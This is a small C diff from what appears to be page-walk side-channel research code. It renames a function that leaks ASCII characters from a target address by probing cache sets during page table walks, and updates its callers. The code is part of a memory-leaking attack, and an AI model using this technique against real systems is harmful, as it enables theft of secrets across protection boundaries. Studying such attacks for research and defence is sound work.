@@ -27,13 +27,13 @@ struct pwsc_ans leak_pwsc_ptr(uint64_t addr, uint64_t *init_noise_filter) {
 
 
 /*
- *  leak_ascii -  Optimized function for ASCII characters: we only need a page walk depth up to VPN4 (depth 1)
+ *  leak_ascii_char -  Optimized function for ASCII characters: we only need a page walk depth up to VPN4 (depth 1)
  *  Inputs:     Address under target, initial noise filter config, expected VPN4 value
  *  Outputs:    pwsc_ans with a complete VPN4 value and VPN3 cache set value. This allows the caller 
  *              to reconstruct one ASCII character
  *  Assumptions: `expected_vpn4_set` is set to `ncache_lines` if there is not an expected value
  */
-struct pwsc_ans leak_ascii(uint64_t addr, uint64_t *init_noise_filter, uint64_t expected_vpn4_set) {
+struct pwsc_ans leak_ascii_char(uint64_t addr, uint64_t *init_noise_filter, uint64_t expected_vpn4_set) {
     
     // Determine VPN4 cache set (this leaks the initial 6 bits of the ascii character)
     struct pwsc_ans init_pwsc_ans; init_pwsc_ans.va.va = 0; init_pwsc_ans.num_lines_found = 0;
@@ -58,7 +58,7 @@ struct pwsc_ans leak_ascii(uint64_t addr, uint64_t *init_noise_filter, uint64_t 
         guess.va.vpn4_co = co_guess<<1; // The least significant bit of the CO is always 0 (since ASCII secret here)
         char *va_buffer = mmap((void *)guess.va.va, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_FIXED_NOREPLACE, -1, 0);
         if(va_buffer == (void *)-1) {
-            fprintf(stderr, "[ERROR] mmap in leak_ascii failed :(\n");
+            fprintf(stderr, "[ERROR] mmap in leak_ascii_char failed :(\n");
             return init_pwsc_ans;
         }
         *va_buffer = 0x5A;
@@ -227,7 +227,7 @@ struct bit_map* leak_addr_range(uint64_t start_leak, uint64_t end_leak, uint64_t
             .va = { .va = 0 },
             .num_lines_found = 0
         };
-        if(ascii_flag) ans = leak_ascii(cur_addr, init_noise_filter, previous_set);
+        if(ascii_flag) ans = leak_ascii_char(cur_addr, init_noise_filter, previous_set);
         else ans = leak_userspace_ptr(cur_addr, init_noise_filter, previous_set);
 
         // In case of larger granularities need additional shifts in the bitmap 
